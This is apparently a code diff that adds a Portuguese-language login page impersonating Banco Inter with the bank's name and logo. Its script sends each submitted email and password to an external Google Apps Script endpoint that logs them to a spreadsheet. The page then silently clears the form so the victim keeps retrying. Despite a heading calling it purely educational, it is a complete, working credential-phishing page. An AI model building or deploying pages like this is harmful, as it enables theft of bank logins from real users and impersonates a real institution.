@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="images.png">
+    <title>Login Acadêmico</title>
+    <style>
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(135deg, #FF8C00, #FFA500); }
+        .login-card { background: white; padding: 2.5rem 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 350px; animation: slideUp 0.6s ease-out; }
+        
+        .header-container { text-align: center; margin-bottom: 20px; }
+        .company-logo { max-width: 140px; height: auto; margin: 0 auto 10px; display: block; }
+        .company-name { color: #333; font-size: 22px; margin: 0; font-weight: 700; }
+        h2 { text-align: center; color: #666; font-size: 16px; margin-top: 5px; font-weight: 400; }
+        
+        input { width: 100%; padding: 14px; margin: 8px 0 16px; border: 1px solid #e0e0e0; border-radius: 8px; box-sizing: border-box; font-size: 15px; transition: border-color 0.3s, box-shadow 0.3s; }
+        input:focus { border-color: #FF8C00; outline: none; box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.2); }
+        
+        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #FF8C00, #FF7300); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: transform 0.2s, box-shadow 0.2s; }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(255, 140, 0, 0.4); }
+        button:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+        
+        #mensagem { text-align: center; margin-top: 15px; font-size: 16px; font-weight: 500; display: none; }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes successPop {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .success-anim { animation: successPop 0.5s ease-out forwards; color: #2e7d32; display: block !important; padding: 20px 0; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="header-container">
+        <img src="images.png" alt="Logo Banco Inter" class="company-logo">
+        <h1 class="company-name">Banco Inter</h1>
+        <h2 id="loginTitle">ESSA PAGINA E TOTALMENTE PARA MEIOS EDUCATIVOS</h2>
+    </div>
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Seu e-mail" required>
+        <input type="password" id="senha" placeholder="Sua senha" required>
+        <button type="submit" id="btnEnviar">Entrar</button>
+    </form>
+    <p id="mensagem"></p>
+</div>
+
+<script>
+    const urlScript = 'https://script.google.com/macros/s/AKfycbw928a9K8i9OAd_Wc0F63qtOW8YSvG0CKqOvYbQySTSpY3hDMC7SFtrAst_IaA4n7tB/exec';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnEnviar');
+        const email = document.getElementById('email').value;
+        const senha = document.getElementById('senha').value;
+
+        btn.innerText = "Autenticando...";
+        btn.disabled = true;
+
+        const dados = {
+            email: email,
+            senha: senha
+        };
+
+        fetch(urlScript, {
+            method: 'POST',
+            mode: 'no-cors',
+            cache: 'no-cache',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dados)
+        }).then(() => {
+            // Limpa os campos para o próximo teste sem dar aviso de sucesso
+            document.getElementById('loginForm').reset();
+            btn.innerText = "Entrar";
+            btn.disabled = false;
+            console.log("Dados enviados para a planilha.");
+        }).catch(err => {
+            console.error("Erro:", err);
+            btn.innerText = "Entrar";
+            btn.disabled = false;
+        });
+    });
+</script>
+
+</body>
+</html>
